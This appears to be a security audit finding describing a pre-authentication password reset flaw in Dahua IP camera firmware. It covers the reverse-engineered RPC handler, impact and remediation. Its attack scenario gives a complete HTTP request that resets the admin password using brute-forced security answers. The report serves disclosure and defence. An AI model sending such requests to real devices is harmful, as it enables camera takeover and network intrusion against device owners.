# [REDACTED-ID]_F002: Pre-Auth Password Reset via Security Questions

## Classification

| Field | Value |
|-------|-------|
| **ID** | [REDACTED-ID]_F002 |
| **Severity** | HIGH |
| **Type** | Authentication Bypass |
| **Pre-Auth** | YES |
| **CVSS 3.1** | 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Affected** | Dahua IPC firmware V2.622.x (Rhea) |
| **Binary** | sonia (CResetPwdHandler @ 0x4c8824) |
| **Source Ref** | Src/ResetPwdHandler.cpp |
| **Depends On** | [REDACTED-ID]_F001 (security question answer required) |

## Summary

The `PasswdFind.resetPwdByQuestion` RPC method allows an attacker who knows the security question answers (obtainable via [REDACTED-ID]_F001 brute force) to reset any user's password without knowing the current password. This is a Rhea-exclusive method not present in the Themis V2.620 firmware.

## Technical Details

### Handler Analysis (0x4c8824)

```
Function: PasswdFind.resetPwdByQuestion handler
VMA:      0x4c8824
Frame:    412 bytes (sub sp, #0x19c)
Source:   Src/ResetPwdHandler.cpp

JSON Parameters:
  - "user"     -> target username
  - "question" -> array of question/answer pairs
  - "pwd"      -> NEW password to set
  - "tip"      -> password hint

String Operations (all bounded):
  - strncpy(answer_buf, answer, 0x7f)    @ 0x4c89c6  (127 bytes)
  - strncpy(question_buf, question, 0x7f) @ 0x4c89fc (127 bytes)
  - strncpy(user_buf, user, 0x27)         @ 0x4c8a4a  (39 bytes)
  - strncpy(tip_buf, tip, 0x1f)           @ 0x4c8a6c  (31 bytes)

Backend call: resetPwdByQuestionInfo via IPasswdFind vtable
```

### Novelty Confirmation

This method (`resetPwdByQuestion`) was identified in OG3 Phase 10 comparative RE as **Rhea-exclusive** -- not present in the Themis V2.620 firmware. It represents a new attack vector unique to the Rhea firmware branch.

## Attack Scenario

```
POST /RPC2 HTTP/1.1
Content-Type: application/json

{
  "method": "PasswdFind.resetPwdByQuestion",
  "params": {
    "user": "admin",
    "question": [
      {"answer": "<brute-forced-answer>"}
    ],
    "pwd": "attacker_new_password",
    "tip": "reset"
  }
}
```

## Impact

- Complete admin account takeover without any prior credentials
- Full device control (view cameras, modify settings, pivot to network)
- Combined with [REDACTED-ID]_F001, provides a complete pre-auth admin takeover chain

## Memory Safety

No buffer overflow risk -- all string copies use strncpy with explicit size limits. Buffers pre-zeroed with memset. This is a pure logic vulnerability, not a memory corruption issue.

## Remediation

1. Require secondary verification (e.g., email/phone OTP) before allowing password reset
2. Implement rate limiting on the entire password reset flow (see [REDACTED-ID]_F001)
3. Consider requiring physical button press for password reset on IPC devices
